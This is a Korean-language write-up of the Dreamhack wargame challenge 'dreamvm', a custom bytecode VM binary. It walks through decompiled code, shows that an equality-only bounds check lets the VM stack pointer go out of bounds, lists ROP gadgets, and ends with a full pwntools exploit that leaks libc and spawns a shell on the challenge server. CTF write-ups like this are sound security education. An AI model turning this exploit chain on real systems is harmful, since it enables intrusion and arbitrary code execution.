---
title: "dreamvm writeup"
date: 2026-04-23 22:57:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, rop, oob, vm, dreamhack]
---

## Analysis

### checksec
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

### Source Code
```c
ssize_t read_all(int fd, void *buf, size_t count)
{
  unsigned __int64 v4; // rbx
  ssize_t result; // rax

  v4 = 0;
  do
  {
    result = read(fd, (char *)buf + v4, count - v4);
    if ( !result )
      break;
    if ( result == -1 )
      return result;
    v4 += result;
  }
  while ( count > v4 );
  return v4;
}

ssize_t __fastcall write_all_constprop_0(__int64 a1)
{
  unsigned __int64 i; // rbx
  ssize_t result; // rax

  for ( i = 0; i <= 7; i += result )
  {
    result = write(1, (const void *)(a1 + i), 8 - i);
    if ( !result )
      break;
    if ( result == -1 )
      return result;
  }
  return i;
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // ebx
  __int64 *v5; // rsi
  ssize_t all; // rbp
  __int64 v7; // rcx
  _DWORD *v8; // rdi
  __int64 *v9; // rax
  __int64 *v10; // rbp
  _BYTE *v11; // rax
  __int64 v12; // rdx
  ssize_t v13; // rax
  _BYTE v15[4104]; // [rsp+0h] [rbp-1038h] BYREF
  _BYTE *v16; // [rsp+1008h] [rbp-30h] BYREF
  _QWORD v17[5]; // [rsp+1010h] [rbp-28h] BYREF

  v17[1] = __readfsqword(0x28u);
  if ( argc == 2 )
  {
    v3 = open(argv[1], 524544, envp);
    v4 = v3;
    if ( v3 == -1 )
      return 1;
    v5 = &code;
    all = read_all(v3, &code, 0x100u);
    close(v4);
  }
  else
  {
    v5 = &code;
    all = read_all(0, &code, 0x100u);
  }
  if ( all <= 0 )
    return 1;
  v7 = 1030;
  v8 = v15;
  while ( v7 )
  {
    *v8++ = 0;
    --v7;
  }
  v16 = &v16;
  v9 = &code;
  while ( 2 )
  {
    v10 = (__int64 *)((char *)v9 + 1);
    switch ( *(_BYTE *)v9 )
    {
      case 1:
        v11 = v16;
        v16 -= 8;
        *((_QWORD *)v11 - 1) = v17[0];
        goto LABEL_19;
      case 2:
        v12 = *(_QWORD *)v16;
        v16 += 8;
        v17[0] = v12;
        goto LABEL_19;
      case 3:
        v17[0] += *(__int64 *)((char *)v9 + 1);
        goto LABEL_15;
      case 4:
        v16 += *(__int64 *)((char *)v9 + 1);
LABEL_15:
        v10 = (__int64 *)((char *)v9 + 9);
        goto LABEL_19;
      case 5:
        v13 = write_all_constprop_0(v17, v5);
        goto LABEL_18;
      case 6:
        v5 = v17;
        v13 = read_all(0, v17, 8u);
LABEL_18:
        if ( v13 != 8 )
          return 1;
LABEL_19:
        if ( v16 == v15 || v16 == (_BYTE *)v17 )
          abort();
        if ( v10 <= (__int64 *)byte_601137 )
        {
          v9 = v10;
          continue;
        }
        return 0;
      default:
        return 0;
    }
  }
}
```

## Vulnerability Analysis

문제 이름이 말해주듯 가상 머신 형태로 구현된 바이너리이다. `v15`는 가상 머신의 스택 역할을 하고, `v16`은 스택 포인터 역할을 한다. `v17[0]`은 이 가상 머신 내 유일한 레지스터로 사용된다.

`v17[1]`에 카나리가 저장되고 `v17[2]` ~ `v17[4]`에 무언가가 저장되는데, 확인을 위해 `main`의 어셈블리를 살펴보자.

```
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000400590 <+0>:     push   r12
   0x0000000000400592 <+2>:     push   rbp
   0x0000000000400593 <+3>:     push   rbx
   0x0000000000400594 <+4>:     sub    rsp,0x1020
   0x000000000040059b <+11>:    mov    rax,QWORD PTR fs:0x28
   0x00000000004005a4 <+20>:    mov    QWORD PTR [rsp+0x1018],rax
   0x00000000004005ac <+28>:    xor    eax,eax
   0x00000000004005ae <+30>:    cmp    edi,0x2
   0x00000000004005b1 <+33>:    jne    0x4005e9 <main+89>
   0x00000000004005b3 <+35>:    mov    rdi,QWORD PTR [rsi+0x8]
   0x00000000004005b7 <+39>:    mov    esi,0x80100
   0x00000000004005bc <+44>:    call   0x400580 <open@plt>
   0x00000000004005c1 <+49>:    cmp    eax,0xffffffff
   0x00000000004005c4 <+52>:    mov    ebx,eax
   0x00000000004005c6 <+54>:    je     0x4006f6 <main+358>
   0x00000000004005cc <+60>:    mov    edx,0x100
   0x00000000004005d1 <+65>:    mov    esi,0x601040
   0x00000000004005d6 <+70>:    mov    edi,eax
   0x00000000004005d8 <+72>:    call   0x400817 <read_all>
   0x00000000004005dd <+77>:    mov    edi,ebx
   0x00000000004005df <+79>:    mov    rbp,rax
   0x00000000004005e2 <+82>:    call   0x400560 <close@plt>
   ...
```

`rbp`가 베이스 포인터가 아닌 일반 연산용 레지스터로 사용되고 있음을 확인할 수 있다. `-fomit-frame-pointer` 컴파일 옵션으로 최적화된 모습이다. 또한 사용할 레지스터가 부족했는지 callee-saved 레지스터인 `r12`, `rbx`도 활용하여 초반부에 백업하고 있다. `v17[2]` ~ `v17[4]`에는 이 `r12`, `rbp`, `rbx`가 저장된다.

소스 코드를 요약하면, 실행할 코드로써 256바이트를 입력받아 각 바이트 값으로 `switch`문에서 분기한다. `case 1`은 `push`, `case 2`는 `pop`이다. `case 3`은 코드의 다음 8바이트를 읽어 레지스터에 더한다. `case 4`는 코드의 다음 8바이트를 읽어 가상 머신 내 스택 포인터를 증가시킨다. `case 5`는 레지스터 값을 출력하고, `case 6`은 표준 입력에서 8바이트를 입력받아 레지스터에 저장한다.

명령어 실행 후 수행되는 아래 검사 코드를 보자.

```c
if ( v16 == v15 || v16 == (_BYTE *)v17 )
    abort();
```

가상 머신의 스택 포인터가 스택 범위를 벗어나면 강제 종료시키려는 의도의 코드이다. `v15`는 가상 머신 스택의 밑바닥이고, `v17`은 스택의 꼭대기 바로 위에 있는 레지스터이다. 그런데 이 조건식에는 치명적인 취약점이 있는데, 부등호가 아닌 등호로 검사하고 있다는 점이다. `case 2`를 사용하면 스택 포인터가 8바이트씩 증가하므로 검사에 걸리지만, `case 4`를 사용하면 원하는 크기만큼 스택 포인터를 한 번에 증가시킬 수 있다. 따라서 이를 이용하면 검사를 우회하여 스택 포인터를 스택 범위 밖으로 벗어나게 만들 수 있다.

이 취약점은 OOB 계열이라 카나리를 건드리지 않고 ROP이 가능하므로 카나리 유출은 필요 없다. 그러나 이 바이너리에는 `get_shell` 같은 함수가 없으므로 우선 libc를 유출해야 한다. 또한 이 문제에서는 libc 파일이나 서버 환경에 대한 정보가 전혀 없으므로 서버가 사용하는 libc 버전도 알아내야 한다. libc 데이터베이스를 활용하면 편한데, 버전을 특정하려면 서로 다른 libc 주소 두 개를 유출해야 한다. ret에 저장된 `main`의 caller인 libc 초기화 함수 주소와 GOT 엔트리를 유출하면 될 것이다.

우선 ret 유출을 위해 `case 4`로 스택 포인터를 ret 위치에 놓은 후 `case 2`로 레지스터에 그 값을 담고, `case 5`로 출력하면 ret을 유출할 수 있다. `write@plt`가 있으므로 GOT 엔트리는 ROP으로 유출할 수 있다. ROP은 `case 4`로 ROP 체인 크기만큼 스택 포인터를 미리 올려놓고, `case 6`과 `case 1`을 반복하여 ROP 체인을 뒤에서부터 거꾸로 8바이트씩 쌓으면 된다. libc 유출 후 쉘을 획득하기 위해, 이 ROP 단계의 마지막 ret 주소는 `main`이 되어야 한다.

`write`로 유출하기 위해 ROP을 하려면 `rdi`, `rsi`, `rdx` 가젯이 모두 필요한데, 아래와 같이 모두 존재하는 것을 확인할 수 있다.

```
$ ROPgadget --binary dreamvm --re "pop rdi"
Gadgets information
============================================================
0x0000000000400903 : pop rdi ; ret

Unique gadgets found: 1

$ ROPgadget --binary dreamvm --re "pop rsi"
Gadgets information
============================================================
0x0000000000400901 : pop rsi ; pop r15 ; ret

Unique gadgets found: 1

$ ROPgadget --binary dreamvm --re "pop rdx"
Gadgets information
============================================================
0x0000000000400852 : mov eax, ebx ; pop rdx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000400854 : pop rdx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret

Unique gadgets found: 2
```

ret과 GOT 엔트리를 성공적으로 유출했다면 libc 데이터베이스에서 버전을 확인할 수 있다. 확인 결과 서버에서 사용하는 libc 버전은 2.3.1이다. 해당 버전의 libc 공유 오브젝트 파일을 libc 데이터베이스에서 다운로드받은 후, 유출한 GOT 엔트리로 libc base를 계산하고 ret2main한다. 이후 입력 대기 중인 서버에 같은 방식으로 쉘 획득을 위한 ROP 페이로드를 구성해 전송하면 쉘을 획득할 수 있다.

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./dreamvm")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 12808)

    return r


def main():
    r = conn()

    rop = ROP(exe)
    rdi_gadget = rop.find_gadget(["pop rdi", "ret"])[0]
    rsi_gadget = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]
    rdx_gadget = rop.find_gadget(["pop rdx", "pop rbx", "pop rbp", "pop r12", "pop r13", "ret"])[0]

    payload = p8(4)
    payload += p64(48)
    payload += p8(2)
    payload += p8(5)
    payload += p8(4)
    payload += p64(96)
    for i in range(13):
        payload += p8(6)
        payload += p8(1)
    payload += b"A" * (0x100 - len(payload))

    rop1 = p64(exe.symbols["main"])
    rop1 += p64(exe.plt["write"])
    rop1 += p64(0) * 4
    rop1 += p64(8)
    rop1 += p64(rdx_gadget)
    rop1 += p64(0)
    rop1 += p64(exe.got["read"])
    rop1 += p64(rsi_gadget)
    rop1 += p64(1)
    rop1 += p64(rdi_gadget)

    r.send(payload + rop1)

    ret_leak = u64(r.recvn(8))
    read_leak = u64(r.recvn(8))

    log.success(f"Leak RET: {hex(ret_leak)}")
    log.success(f"Leak READ GOT: {hex(read_leak)}")

    pause()

    libc = ELF('./libc.so.6')
    libc.address = read_leak - libc.symbols["read"]

    binsh = next(libc.search(b"/bin/sh\x00"))
    system = libc.symbols["system"]

    payload2 = p8(4)
    payload2 += p64(72)
    for i in range(3):
        payload2 += p8(6)
        payload2 += p8(1)
    payload2 += b"A" * (0x100 - len(payload2))

    rop2 = p64(system)
    rop2 += p64(binsh)
    rop2 += p64(rdi_gadget)

    r.send(payload2 + rop2)

    r.interactive()


if __name__ == "__main__":
    main()
```